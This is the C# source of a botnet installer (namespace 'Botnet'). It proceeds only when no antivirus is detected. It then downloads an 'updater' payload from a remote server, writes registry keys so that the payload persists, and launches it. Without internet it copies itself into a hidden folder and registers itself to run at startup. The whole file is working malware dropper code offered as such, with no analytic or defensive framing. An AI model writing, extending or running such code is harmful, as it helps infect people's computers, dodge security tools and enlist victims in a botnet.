using System.IO;

namespace Botnet
{
    class Installer
    {
        static void Main(string[] args)
        {
            if (!Utility.AntivirusInstalled())
            {
                if (File.Exists(Utility.mainDir + Utility.updaterName))
                {
                    if (!Utility.IsProcessRunningByName(Utility.mainProgramName))
                    {
                        System.Diagnostics.Process.Start(Utility.mainDir + Utility.updaterName);
                    }
                }
                else
                {
                    string[] path = System.Reflection.Assembly.GetExecutingAssembly().CodeBase.Split('/');
                    if (path[path.Length - 2].Equals(Utility.mainFolderName))
                    {
                        Utility.WaitForInternet();
                        Utility.DownloadFile(Utility.SOFTWARE_REMOTE_DIR + Utility.updaterName, Utility.mainDir + Utility.updaterName);
                        Utility.AddRegistryKey(Utility.registryKeyUpdater, Utility.mainDir + Utility.updaterName);
                        Utility.DeleteRegistryKey(Utility.registryKeyInstaller);
                        System.Diagnostics.Process.Start(Utility.mainDir + Utility.updaterName);
                    }
                    else
                    {
                        Directory.CreateDirectory(Utility.mainDir);
                        if (Utility.IsInternetAvailable())
                        {
                            Utility.DownloadFile(Utility.SOFTWARE_REMOTE_DIR + Utility.updaterName, Utility.mainDir + Utility.updaterName);
                            Utility.AddRegistryKey(Utility.registryKeyUpdater, Utility.mainDir + Utility.updaterName);
                            Utility.DeleteRegistryKey(Utility.registryKeyInstaller);
                            System.Diagnostics.Process.Start(Utility.mainDir + Utility.updaterName);
                        }
                        else
                        {
                            File.Copy(System.Reflection.Assembly.GetExecutingAssembly().CodeBase, Utility.mainDir + Utility.installerName, true);
                            Utility.AddRegistryKey(Utility.registryKeyInstaller, Utility.mainDir + Utility.installerName);
                            System.Diagnostics.Process.Start(Utility.mainDir + Utility.installerName);
                        }
                    }
                }
            }
        }
    }
}